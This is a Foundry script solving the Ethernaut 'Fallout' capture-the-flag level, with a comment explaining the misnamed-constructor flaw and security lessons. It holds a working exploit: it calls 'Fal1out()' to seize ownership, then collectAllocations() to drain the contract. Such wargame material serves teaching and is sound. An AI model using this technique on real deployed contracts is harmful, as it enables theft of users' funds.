// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ethernaut/levels/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title FalloutSolver
 * @notice Simple script to solve the Fallout challenge
 * @dev Run with `forge script script/solutions/FalloutSolver.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract FalloutSolver is Script {
    // Instance address - replace with your own if needed
    Fallout public falloutInstance = Fallout(0x2fAcF583e6d2DaA4532CB36ABA5d74B42515070f);

    function setUp() public {
    }

    function run() public {
        // Get player address from private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        
        console.log("Fallout instance address:", address(falloutInstance));
        console.log("Player address:", player);
        
        vm.startBroadcast(privateKey);

        // Step 1: Call the misspelled constructor function to become the owner
        // This works because the constructor was incorrectly implemented as a regular function
        console.log("Step 1: Calling Fal1out() with 0.0001 ether...");
        falloutInstance.Fal1out{value: 0.0001 ether}();
        
        // Step 2: Verify player is now the owner
        console.log("Step 2: Verifying new owner...");
        console.log("New owner:", falloutInstance.owner());
        
        // Step 3: Collect allocations to withdraw funds (optional)
        console.log("Step 3: Collecting allocations to drain contract...");
        falloutInstance.collectAllocations();
        
        console.log("Challenge completed successfully!");
        
        vm.stopBroadcast();
    }
}

/*
 * VULNERABILITY EXPLANATION
 * -----------------------
 * The Fallout contract has a function intended to be a constructor, but it's implemented incorrectly:
 *
 * ```solidity
 * // constructor
 * function Fal1out() public payable {
 *     owner = msg.sender;
 *     allocations[owner] = msg.value;
 * }
 * ```
 *
 * There are two critical issues:
 * 1. In Solidity 0.6.0+, constructors must use the `constructor` keyword, not the contract name
 * 2. There's a typo in the function name ("Fal1out" uses the number "1" instead of letter "l")
 *
 * EXPLOIT TECHNIQUE
 * -----------------------
 * 1. Call the `Fal1out()` function with a small amount of ETH (it's a payable function)
 * 2. You immediately become the owner and your allocation is recorded
 * 3. As owner, you can call `collectAllocations()` to drain the contract
 *
 * SECURITY LESSONS
 * -----------------------
 * This vulnerability highlights the dangers of outdated constructor patterns and typos in critical 
 * functions. Before Solidity 0.4.22, constructors were declared using the contract name, which 
 * was error-prone. This led to numerous security incidents where misnamed constructors became 
 * publicly callable functions.
 *
 * Always use the explicit `constructor` keyword, follow current Solidity best practices, and 
 * carefully review your code for typos, especially in security-critical functions. Using automated 
 * tools to detect such inconsistencies can help prevent these vulnerabilities.
 *
 * Additionally, pay attention to state changes in payable functions. In this case, the function 
 * records the sent value in the allocations mapping, which becomes important when using functions 
 * like `collectAllocations()` that interact with the contract's funds.
 */ 